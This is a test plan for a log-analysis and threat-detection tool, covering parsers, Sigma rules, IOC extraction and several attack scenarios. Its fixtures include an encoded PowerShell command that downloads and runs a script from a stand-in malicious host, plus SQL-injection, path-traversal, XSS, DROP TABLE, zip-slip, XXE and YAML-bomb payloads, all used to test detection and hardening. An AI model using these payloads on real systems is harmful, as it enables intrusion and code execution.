# 09 — Test Plan

## 1. Strategy

| Level | Tooling | Scope |
|---|---|---|
| Unit | pytest, hypothesis | parsers, normalizers, IOC regex/validators, refang/decoders, MITRE mapping, scoring, time handling, SQL compilation of Sigma modifiers |
| Integration | pytest + temp SQLite | ingest pipeline, detection runs, correlation, API (FastAPI TestClient), WebSocket, report generation |
| E2E | Playwright | the three scenarios below through the real UI |
| Property/fuzz | hypothesis, atheris-style corpus tests | parsers never crash and never lose a record; regexes terminate fast |
| Performance | pytest-benchmark + scripts | throughput targets in §8 |
| Security | pytest | upload/archive abuse, XSS payloads in logs, no outbound sockets (§9) |

CI gates (`make test`): lint (ruff, mypy strict on `app/`), unit + integration, frontend lint/typecheck/vitest, E2E, coverage ≥ 85% on `parsers`, `detect`, `ioc`, `mitre`.

## 2. Fixtures

`backend/tests/fixtures/<area>/` — synthetic, committed, small (< 200 KB each) and generated reproducibly by `scripts/make_fixtures.py` (seeded). Each fixture has a sibling `*.expected.json` (normalized events or alert/IOC results). Update expected files only via an explicit `--update-golden` flag.

Required fixtures:

| File | Content |
|---|---|
| `evtx/security_logons.evtx` (+ `.xml` export) | 4624 (types 2, 3, 10), 4625 ×12 (two source IPs, 11 distinct usernames), 4688 with command lines, 4698, 4720, 1102 |
| `evtx/sysmon_attack.evtx` (+ `.xml`) | Sysmon 1 (encoded PowerShell, `certutil -urlcache`, `rundll32` odd path), 3 (external connect), 11, 13 (Run key), 22 |
| `evtx/powershell_4104.evtx` | script block with `Invoke-WebRequest` to a URL and a base64 blob |
| `linux/auth.log` | Scenario A lines (below) + sudo, su, useradd, cron noise |
| `linux/syslog_variants.log` | RFC3164, RFC3339, RFC5424 lines + continuation lines + garbage lines |
| `linux/journal.json` | 30 journald JSON entries incl. array-encoded MESSAGE |
| `linux/audit.log` | SYSCALL+EXECVE+PATH groups, hex-encoded args, SOCKADDR connect, USER_LOGIN failed |
| `web/access_combined.log` | Scenario B lines + malformed request lines |
| `web/nginx_error.log`, `web/apache_error.log`, `web/iis.log` | |
| `fw/ufw.log`, `fw/pfsense_filterlog.log`, `fw/fortigate.log`, `fw/paloalto_traffic.csv`, `fw/asa.log` | Scenario C data included in `ufw.log` |
| `generic/ecs.ndjson`, `generic/cloudtrail.json`, `generic/zeek_conn.log`, `generic/custom.csv` | |
| `archives/bundle.zip` | contains 3 of the logs above; `zipbomb.zip` (ratio > limit), `zipslip.zip` (`../../evil`), `symlink.tar` |
| `rules/` | SigmaHQ sample (≥ 200 rules), invalid YAML, unsupported modifier, unroutable logsource, nested correlation |

Public datasets for **manual** validation (not committed; document in `docs/validation.md`): EVTX-ATTACK-SAMPLES (sbousseaden), OTRF Security-Datasets (Mordor), Hayabusa sample EVTX, loghub (Linux/Apache/OpenSSH/Hadoop logs).

## 3. Parser tests (per parser)

For each parser: ≥ 10 valid-record tests asserting exact normalized output (all columns + `fields_json` keys), ≥ 5 malformed-record tests asserting a `parse_errors` row and continued parsing, plus:

- P-01 empty file → 0 events, no error, status `done`.
- P-02 file with only garbage → `error_count == lines`, status `done` with warning (not failed).
- P-03 CRLF, BOM, UTF-16, gzip-wrapped variants parse identically.
- P-04 a 5 MB single line is truncated with marker and counted, parse continues.
- P-05 timestamps: syslog year inference (Dec → Jan rollover; file mtime year), timezone conversion (e.g., `Africa/Tunis` default tz → UTC), DST ambiguities handled deterministically.
- P-06 IPv6/`::ffff:` normalization; invalid IP kept only in `fields_json`.
- P-07 EVTX: `EventID` as dict, unnamed `Data` elements, `UserData` events (1102/104), Sysmon `Hashes` split into `Hash_*` keys.
- P-08 auditd: events split across serial boundaries; hex args decoded; missing EXECVE handled.
- P-09 web: percent-encoded URL stored raw, decoded copy in `fields_json.url_decoded`; `"-"` request lines tolerated.
- P-10 firewall: pfSense IPv4 vs IPv6 index maps; Fortinet quoted values; PAN field map by version; ASA 106023/106100/302013.
- P-11 generic profiles: path resolution with arrays, epoch units, missing keys.
- P-12 detection: every sample in `fixtures/*` is auto-detected as the correct `log_type` with confidence ≥ 0.8; mixed/unknown text yields `needs_input`.
- P-13 property test: for any generated line set, `events + parse_errors == non-empty input records`.

## 4. Detection tests

- D-01 each Sigma modifier (`contains, startswith, endswith, all, re, cidr, base64, base64offset, utf16le, utf16be, wide, windash, exists, cased, neq, lt, lte, gt, gte, fieldref, expand`) has a rule + events asserting exact matching ids; includes SQL-special characters (`%`, `_`, `\`, `'`) in values.
- D-02 conditions: `1 of`, `all of`, `not`, nested parentheses, keyword searches.
- D-03 logsource routing: each routing entry in `logsource_map.yaml` selects exactly its events; unknown logsource → `unroutable`.
- D-04 pruning: rules with no matching inventory are `skipped_no_data`.
- D-05 timeout: an artificially slow regex rule hits `rule_timeout_seconds` (use 1 s in test) → status `timeout`, other rules unaffected.
- D-06 ReDoS: `(a+)+$` custom rule against `"a"*50 + "!"` returns within the regex timeout and records an error, never hangs.
- D-07 correlation: boundary tests for `event_count` (9 vs 10 events; window edges inclusive/exclusive as specified), `value_count`, `temporal`, `temporal_ordered` (order violation), nested correlation depth 3, `generate: true/false`.
- D-08 alert grouping: gap > window splits alerts; deterministic ids across two runs; analyst status preserved on re-run.
- D-09 scoring: each modifier covered; clamping at 100 and 0; breakdown sums to score.
- D-10 MITRE: tag parsing (`attack.t1059.001`, `attack.defense_evasion`, `attack.g0032`, unknown ID), parent credit, fallback map, matrix aggregation, Navigator layer schema validation.
- D-11 builtin rules: each of the ten groups fires on its fixture and **only** there (negative fixtures included).
- D-12 compile health: ≥ 200 SigmaHQ rules compile; failures bucketed in `DECISIONS.md`.

## 5. IOC tests

- I-01 ≥ 150 table-driven cases: valid/invalid IPv4 (leading zeros, versions like `10.1.2.3-beta`), IPv6, domains (IDN/punycode, ambiguous TLDs, filenames that look like domains such as `update.sh`, `config.py`), URLs with trailing punctuation, emails, MD5/SHA1/SHA256 boundaries (inside longer hex, GUIDs, repeated chars), CVEs, registry keys, paths.
- I-02 refang matrix (`hxxp://evil[.]com/a`, `user[at]evil(dot)com`, `1[.]2[.]3[.]4`).
- I-03 decoding: PowerShell `-enc` UTF-16LE, `FromBase64String`, double-encoded (depth 2 ok, depth 3 stopped), non-printable decode rejected.
- I-04 classification: private/reserved/CGNAT flagged; documentation ranges treated public; allowlist suffix matching (`a.schemas.microsoft.com`).
- I-05 scoring table tests for each modifier; clamping.
- I-06 dedup: same IOC across events/sources → one row, correct counts, min/max timestamps; occurrence cap 50.
- I-07 tiering: paths/registry/commands extracted only from alert events and only when filters pass.
- I-08 exports: STIX bundle validates (stix2 library schema check), CSV round-trip, defang correctness.

## 6. API tests

Every endpoint in 06: happy path, validation error, not-found, auth required when bound non-loopback, pagination/cursor stability (insert during paging does not duplicate/skip), filter combinations, FTS syntax error handling, concurrent upload of 3 files, cancel job mid-parse (partial data removed), delete source cascades, WebSocket message sequence for an ingest (queued → parsing progress → detecting → done), audit-log chain verification detects tampering (modify a row → `chain_ok=false`).

## 7. End-to-end scenarios (must pass; expected results are normative)

### Scenario A — SSH brute force then login (Linux auth)

`fixtures/linux/auth.log` contains (host `web01`, timestamps within 3 minutes, the test passes `assumed_year=2025` and timezone UTC):

```
Oct  3 02:14:01 web01 sshd[1201]: Invalid user admin from 185.220.101.45 port 51122
Oct  3 02:14:03 web01 sshd[1201]: Failed password for invalid user admin from 185.220.101.45 port 51122 ssh2
Oct  3 02:14:05 web01 sshd[1203]: Failed password for invalid user test from 185.220.101.45 port 51140 ssh2
... (total 14 failures, users: admin, test, oracle, ubuntu, root alternating, same IP)
Oct  3 02:16:40 web01 sshd[1244]: Accepted password for root from 185.220.101.45 port 51890 ssh2
Oct  3 02:16:41 web01 sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash svc_backup
Oct  3 02:16:41 web01 useradd[1260]: new user: name=svc_backup, UID=1001, GID=1001, home=/home/svc_backup, shell=/bin/bash
```
Expected:
- Alerts: *SSH Brute Force From Single Source* (high, T1110.001, credit-access, `match_count=14`, host web01), *SSH Successful Login After Failures From Same Source* (critical, T1078 + T1110), *Local User Account Created (Linux)* (medium, T1136.001).
- IOCs: `ipv4 185.220.101.45` (confidence ≥ 90, linked to all 3 alerts, occurrences ≥ 15).
- MITRE view: tactics credential-access, initial-access, persistence populated.
- Entities: host `web01`; users include root, admin, test, svc_backup.

### Scenario B — Web attack (Apache combined)

`fixtures/web/access_combined.log` includes: 200+ benign requests; 15 requests from `45.155.205.233` with UA `sqlmap/1.7` containing `' or 1=1--` and `union select` in the query; 3 requests with `../../etc/passwd`; one `POST /uploads/shell.php` returning 200.
Expected alerts: SQL Injection Patterns (high, T1190), Scanner UA (medium, T1595.002), Path Traversal (high, T1190), Web Shell-Like Request (medium, T1505.003). IOCs: `45.155.205.233`, URL(s) from the shell upload line (as `filepath`/URL form, tier 2). Benign requests produce no alerts.

### Scenario C — Windows intrusion chain (Sysmon + Security EVTX)

`fixtures/evtx/*` represents: 4625 spray from `198.51.100.77` against 11 accounts, successful 4624 type 3 from same IP, Sysmon 1 `powershell.exe -nop -w hidden -enc <base64 of "IEX (New-Object Net.WebClient).DownloadString('http://malicious-update[.]example.org/a.ps1')">`, Sysmon 3 connection to `192.0.2.66:443`, Sysmon 13 Run-key persistence, 4698 scheduled task, 1102 log cleared.
Expected: Password spraying (high, T1110.003) from the correlation; SigmaHQ encoded-PowerShell rules fire (T1059.001); Run-key persistence (T1547.001); scheduled task (T1053.005); log cleared (T1070.001). IOCs: IPs `198.51.100.77`, `192.0.2.66`; domain `malicious-update.example.org` (decoded from PowerShell, `decoded_from='powershell_enc'`, URL `http://malicious-update.example.org/a.ps1`); registry Run key value; filepath of the dropped script. (Documentation-range IPs are treated as public by design — see 05 §5.)
UI E2E for each scenario: upload via dropzone → watch progress → open Alerts → open top alert drawer and assert technique chips and evidence → open MITRE and assert cells → IOCs tab export CSV and assert contents → generate HTML report and assert sections present.

## 8. Performance targets (reference laptop: 8 cores, 16 GB RAM, NVMe)

| Test | Target |
|---|---|
| Text log parse + normalize + IOC tier 1 + persist | ≥ 30,000 events/s per worker, ≥ 100,000 events/s total with 4 workers |
| EVTX parse + persist | ≥ 8,000 records/s per worker |
| 1M-event case, `standard` profile detection | ≤ 5 minutes, RSS ≤ 2 GB |
| Events API first page (5M events, indexed filter) | p95 < 300 ms |
| FTS query on 5M events | p95 < 1 s |
| UI first meaningful paint of Alerts (1,000 alerts) | < 1 s |
| Memory while ingesting a 10 GB text file | RSS ≤ 1.5 GB total |

Benchmarks live in `backend/tests/perf/`, run via `make perf`, and record results in `docs/perf-results.md` (device info included). Missing a target is documented in `DECISIONS.md` with the profiled bottleneck.

## 9. Security tests

- S-01 zip bomb, zip-slip, symlink, absolute path, 10-level nested archive → rejected with `ARCHIVE_LIMIT_EXCEEDED`/`FORBIDDEN_PATH`; nothing written outside the case dir.
- S-02 Log lines containing `<script>alert(1)</script>`, `"><img src=x onerror=alert(1)>`, ANSI escapes, RTL override characters, and 1 MB of `{` characters render as inert text in UI (Playwright asserts no dialog, DOM contains text nodes) and are escaped in HTML/MD/PDF reports.
- S-03 CSV injection fields prefixed in exports.
- S-04 SQL injection through every filter param and rule field name (`'; DROP TABLE events;--`) has no effect (parameterized queries; field names validated against an allowlist or JSON-path quoted).
- S-05 Outbound network: with a socket guard fixture (patch `socket.socket.connect`), full ingest → detect → report run performs zero connects; with `allow_enrichment=false` the enrichment endpoint returns 403.
- S-06 Non-loopback bind without token refuses to start.
- S-07 YAML bombs (billion laughs) in rule import rejected (size/alias limits).
- S-08 EVTX/XML: XXE payload in event XML export does not resolve entities.
- S-09 Crashing worker (simulate segfault via `os._exit`) → source `failed` with message, server stays up, other jobs continue.
